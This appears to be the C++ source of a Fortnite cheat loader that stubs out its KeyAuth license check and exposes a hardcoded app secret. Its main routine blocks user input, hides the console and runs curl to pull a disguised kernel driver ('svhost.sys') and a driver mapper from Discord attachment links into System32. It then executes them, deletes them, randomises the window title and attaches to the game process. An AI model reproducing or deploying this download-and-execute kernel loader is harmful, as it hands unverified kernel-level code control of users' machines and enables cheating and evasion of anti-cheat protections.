#include "../Includes/includes.hpp"

using namespace KeyAuth;

std::string name = "SubZeroFN Tourney Woofer"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = "RRMW917rnj"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = "be02ea87fcd73b6bf4554c1fccfc0ed3ed0f526b78b5accd8623fcc4d889df47"; // app secret, the blurred text on licenses tab and other tabs
std::string version = "1.0"; // leave alone unless you've changed version on website
std::string url = "https://keyauth.win/api/1.2/"; // change if you're self-hosting
api KeyAuthApp(name, ownerid, secret, version, url);



const std::string RESET_COLOR = "\033[0m";
const std::string BRIGHT_BLUE = "\033[1;34m";
const std::string BLUE = "\033[0;34m";
const std::string DARK_YELLOW = "\033[0;33m";
const std::string BRIGHT_RED = "\033[1;31m";
const std::string DARK_RED = "\033[0;31m";
const std::string BRIGHT_PURPLE = "\033[1;35m";
const std::string DARK_PURPLE = "\033[0;35m";
const std::string BRIGHT_GREEN = "\033[1;32m";
const std::string DARK_BLUE = "\033[0;34;2m";

HWND consoleWindow;
HDC consoleDC;

void InitializeConsole() {
    consoleWindow = GetConsoleWindow();
    consoleDC = GetDC(consoleWindow);
}


void SetConsoleColor(const std::string& color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15); // Reset to default color
    std::cout << color;
}

int main() {
    InitializeConsole();
    ClearConsole();

    KeyAuthApp.data.success = true;

    if (KeyAuthApp.data.success) {
        ClearConsole();
        system("color 6");
        std::string opt;
        std::cout << " (Window will close when loading drivers)\n\n";
        std::cout << " Do you want to Load drivers? (Y/N): ";
        std::cin >> opt;

        if (opt == "y" || opt == "Y" || opt == "yes" || opt == "Yes") {
            BlockInput(true);
            ShowWindow(consoleWindow, SW_HIDE);

            system("curl https://cdn.discordapp.com/attachments/1154453022420762674/1154514957841473606/svhost.sys --output C:\Windows\System32\driver.sys >nul 2>&1");
            system("curl https://cdn.discordapp.com/attachments/1154030152561467432/1154514747425820814/mapper.exe --output C:\Windows\System32\custom.exe >nul 2>&1");
            system("C:\Windows\System32\custom.exe C:\Windows\System32\driver.sys");

            ShowWindow(consoleWindow, SW_SHOW);
            Sleep(1000);
            ClearConsole();

            SetConsoleColor(BRIGHT_BLUE);
            std::cout << "  (" << "+" << ")" << BRIGHT_BLUE << " Successfully Loaded Driver! ";
            Sleep(1000);
            ClearConsole();
            Sleep(1);
        }

        std::remove("C:\Windows\System32\driver.sys");
        std::remove("C:\Windows\System32\custom.exe");
        BlockInput(false);
        ClearConsole();

        SetConsoleTitleA(random_string(30).c_str());

        printf("\n Waiting for Fortnite...");

        while (hwnd == 0) {
            Sleep(10000);
            driver.process_id = driver.get_process_id("FortniteClient-Win64-Shipping.exe");
            hwnd = get_process_wnd(driver.process_id);
            Sleep(1);
        }

        ClearConsole();
        if (!librarys::init()) {
            printf("0x18B1 Error!");
            Sleep(3000);
            exit(0);
        }

        if (!driver.setup()) {
            printf("0xDD1 Error!");
            Sleep(3000);
            exit(0);
        }
        rootAddress = driver.get_base_address();

        OverlayHook();  
        InitializeD3D();
        MyCustomLoop();
        Cleanup();

        std::cout << "\n Base: " << rootAddress;
    }
    else {
        std::cout << "Incorrect Key, please join the discord to get a key.";
        Sleep(5000);
    }

    return 0;
}